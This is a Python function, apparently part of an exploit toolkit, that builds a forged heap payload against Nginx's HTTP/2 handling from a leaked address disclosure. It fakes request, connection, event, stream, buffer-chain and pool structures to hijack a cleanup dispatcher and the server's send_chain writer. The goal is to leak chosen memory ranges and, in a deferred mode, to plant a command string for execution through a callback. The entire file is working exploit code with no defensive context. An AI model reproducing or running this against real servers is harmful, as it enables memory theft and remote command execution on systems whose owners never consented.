import struct

def forge_address_disclosure(disclosure, profile, holder, nginx_anchor,
                             segments, stream_id, command):
    """Build a target-owned HTTP/2 writer invocation over ``address``."""
    request_offset, writer, h2c = locate_http2_request(
        disclosure, nginx_anchor, profile)
    copy_context_offset, copy_context_index = locate_copy_filter_context(
        disclosure, request_offset, profile)
    send_chain_delta = profile["fingerprint"]["http2_send_chain_delta"]
    heap = profile["heap"]
    abi = heap["address_disclosure"]
    offsets = abi["holder_offsets"]
    request_abi, request_fields = abi["request"], abi["request"]["fields"]
    context_abi, context_fields = (abi["copy_context"],
                                   abi["copy_context"]["fields"])
    connection_fields = abi["connection"]["fields"]
    event_fields = abi["event"]["fields"]
    stream_fields = abi["stream"]["fields"]
    chain_abi, buffer_fields = abi["chain"], abi["chain"]["fields"]
    pool_fields, pool_extra = heap["pool_field_offsets"], \
        abi["pool_extra_fields"]
    value = bytearray(heap["holder_value_bytes"])

    # The cleanup dispatcher is kept as the primitive.  Everything after its
    # first record is an ordinary request, fake HTTP/2 connection, chain, and
    # allocator arena consumed by Nginx's normal write filter.
    request_at = offsets["request"]
    connection_at = request_at + request_abi["bytes"]
    event_at = connection_at + abi["connection"]["bytes"]
    log_at = event_at + abi["event"]["bytes"]
    stream_at = offsets["stream"]
    node_at = offsets["node"]
    chain_at = offsets["chain"]
    context_at = offsets["context"]
    copy_context_at = offsets["copy_context"]
    pool_at = offsets["pool"]
    pool_data_at = offsets["pool_data"]
    # Align the synthetic pool end for Nginx's normal small-allocation checks.
    pool_end_at = len(value) & ~0xf

    def absolute(offset):
        """Translate one holder-relative placement into a leaked address."""
        return holder + offset

    value[request_at:request_at + request_abi["bytes"]] = disclosure[
        request_offset:request_offset + request_abi["bytes"]]
    # H starts with the cleanup record that calls the cloned request's writer.
    struct.pack_into("<QQQ", value, 0, 0, 0, 0)

    # ngx_http_request_t
    struct.pack_into("<Q", value, request_at + request_fields["context"],
                     absolute(context_at))
    for field, target in (("connection", connection_at), ("pool", pool_at),
                          ("self", request_at), ("stream", stream_at)):
        struct.pack_into("<Q", value, request_at + request_fields[field],
                         absolute(target))
    for offset in request_abi["zero_qwords"]:
        struct.pack_into("<Q", value, request_at + offset, 0)
    # Reset inherited request state and keep only the references needed for one
    # writer/finalization pass.
    struct.pack_into("<Q", value, request_at + request_fields["count"], 2)
    flags_at = request_at + request_fields["flags"]
    value[flags_at:flags_at + request_abi["flag_bytes"]] = \
        b"\0" * request_abi["flag_bytes"]
    struct.pack_into("<I", value, flags_at, 1)
    value[request_at + request_fields["buffered"]] |= 0x40  # H2 output pending

    value[copy_context_at:copy_context_at + context_abi["bytes"]] = disclosure[
        copy_context_offset:copy_context_offset + context_abi["bytes"]]
    struct.pack_into("<Q", value, context_at + 8 * copy_context_index,
                     absolute(copy_context_at))
    for field, target in (("free", 0), ("busy", chain_at), ("out", 0),
                          ("allocated", 0), ("tag", 0), ("last_out", 0),
                          ("last", 0), ("pool", pool_at), ("filter_ctx", 0),
                          ("request", request_at)):
        struct.pack_into("<Q", value,
                         copy_context_at + context_fields[field],
                         absolute(target) if target else 0)

    # ngx_connection_t and its already-ready synthetic write event.
    struct.pack_into("<Q", value, connection_at + connection_fields["data"],
                     absolute(request_at))
    struct.pack_into("<Q", value, connection_at + connection_fields["write"],
                     absolute(event_at))
    struct.pack_into("<Q", value,
                     connection_at + connection_fields["send_chain"],
                     nginx_anchor + send_chain_delta)
    struct.pack_into("<Q", value, connection_at + connection_fields["log"],
                     absolute(log_at))
    deferred = heap.get("deferred_execution")
    event_data = (absolute(heap["holder_user_to_pool_bytes"])
                  if deferred else absolute(connection_at))
    struct.pack_into("<Q", value, event_at + event_fields["data"], event_data)
    # Mark the synthetic write event as ready/active so Nginx runs its handler.
    struct.pack_into("<Q", value, event_at + event_fields["flags"], 0x29)
    if deferred:
        struct.pack_into(
            "<Q", value, event_at + event_fields["handler"],
            nginx_anchor + profile["fingerprint"]["resolver_timeout_delta"])
    struct.pack_into("<Q", value, event_at + event_fields["log"],
                     absolute(log_at))

    # ngx_http_v2_stream_t/node and one or more memory ngx_buf_t objects.
    struct.pack_into("<Q", value, stream_at + stream_fields["request"],
                     absolute(request_at))
    struct.pack_into("<Q", value, stream_at + stream_fields["connection"], h2c)
    struct.pack_into("<Q", value, stream_at + stream_fields["node"],
                     absolute(node_at))
    struct.pack_into("<Q", value, stream_at + stream_fields["send_window"],
                     MAX_WINDOW)
    struct.pack_into("<Q", value,
                     stream_at + stream_fields["connection_window"], 65535)
    struct.pack_into("<Q", value, stream_at + stream_fields["pool"],
                     absolute(pool_at))
    struct.pack_into("<Q", value, node_at, stream_id)
    if not segments or len(segments) > 2:
        raise RuntimeError("address disclosure requires one or two segments")
    for index, (address, size) in enumerate(segments):
        item_at = chain_at + index * chain_abi["item_bytes"]
        buffer_at = item_at + chain_abi["buffer_offset"]
        next_at = chain_at + (index + 1) * chain_abi["item_bytes"]
        struct.pack_into("<QQ", value, item_at, absolute(buffer_at),
                         absolute(next_at) if index + 1 < len(segments) else 0)
        for field in ("pos", "start"):
            struct.pack_into("<Q", value, buffer_at + buffer_fields[field],
                             address)
        for field in ("last", "end"):
            struct.pack_into("<Q", value, buffer_at + buffer_fields[field],
                             address + size)
        # Both requested ranges are ordinary in-memory Nginx buffers.
        struct.pack_into("<Q", value, buffer_at + buffer_fields["flags"], 0x22)

    # A small valid allocator is sufficient for the DATA-frame and header
    # objects generated around the caller-owned chain.
    struct.pack_into("<Q", value, pool_at + pool_fields["last"],
                     absolute(pool_data_at))
    struct.pack_into("<Q", value, pool_at + pool_fields["end"],
                     absolute(pool_end_at))
    struct.pack_into("<Q", value, pool_at + pool_extra["max"],
                     pool_end_at - pool_at - 0x50)
    struct.pack_into("<Q", value, pool_at + pool_fields["current"],
                     absolute(pool_at))
    struct.pack_into("<Q", value, pool_at + pool_extra["log"],
                     absolute(log_at))

    if deferred:
        command_at = heap["callback_command_offset"]
        value[command_at:command_at + len(command) + 1] = command + b"\0"

    pool_stub = bytearray(heap["pool_stub_bytes"])
    struct.pack_into("<Q", pool_stub, heap["pool_field_offsets"]["cleanup"],
                     holder)
    overlap = bytearray(b"L" * heap["overlap_prefix_bytes"])
    if "victim_chunk_size_word" in heap:
        struct.pack_into("<QQ", overlap, len(overlap) - 0x10, 0,
                         heap["victim_chunk_size_word"])
    adaptive = overlap + pool_stub
    return value, adaptive
